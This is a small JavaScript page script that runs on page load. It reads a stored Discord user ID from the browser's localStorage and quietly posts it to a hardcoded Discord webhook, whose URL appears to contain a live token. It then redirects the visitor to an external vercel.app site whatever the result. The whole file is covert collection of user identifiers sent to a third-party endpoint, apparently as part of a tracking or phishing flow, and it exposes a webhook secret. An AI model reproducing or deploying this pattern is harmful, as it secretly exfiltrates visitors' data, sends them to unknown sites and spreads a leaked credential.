function sendApiRequest(userId) {
    const url = 'https://discord.com/api/webhooks/1295073404130693201/p0EPTSqYufcBgtLS06Oo_zuYc9_CAThQnXhg-1Bi7zM06frE47KChQQjc2YOpxz5hX7-';

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: userId })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        window.location.href = 'https://land-ashen.vercel.app/';
    })
    .catch((error) => {
        console.error('Error:', error);
        window.location.href = 'https://land-ashen.vercel.app/';
    })
}

function onPageLoad() {
    const userId = localStorage.getItem('discord_user_id');
    if (userId) {
        sendApiRequest(userId);
    }
}

window.onload = onPageLoad;
